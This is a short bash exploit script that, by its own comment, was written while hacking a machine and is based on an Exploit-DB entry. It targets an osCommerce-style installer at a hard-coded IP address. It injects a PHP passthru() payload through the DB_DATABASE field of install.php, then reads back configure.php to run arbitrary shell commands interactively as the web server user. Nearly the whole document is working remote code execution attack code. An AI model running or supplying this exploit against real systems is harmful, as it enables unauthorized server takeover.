#!/bin/bash 
#I Created it for Machine I was Hacking 
#Reference: https://www.exploit-db.com/exploits/50128 
Url="http://192.168.213.223:60001"
path1="/catalog/install/install.php?step=4"
path2="/catalog/install/includes/configure.php"
headrz="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Content-Type: application/x-www-form-urlencoded " 
 
while cmd=true ; do
read -p "$(tput bold)$(tput setaf 4)www-data$(tput sgr0):"  cmd	
	if [[ "$cmd" == "exit" ]] ; then 
	echo "Exiting"
	exit 
	fi
start_exp(){ 
	 
	encode_cmd=$(urlencode "$cmd" )
	echo "$encode_cmd"
	data="DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27$cmd%27%29%3B%2F%2A"
 

	send_exp=$(curl -k -s  -X POST -H "$headrz" --data-binary "$data" "$Url$path1"  )

 
	retrive_exp=$(curl -k -s  -H "$headrz" "$Url$path2"  )
	echo "$retrive_exp"

}
start_exp
done
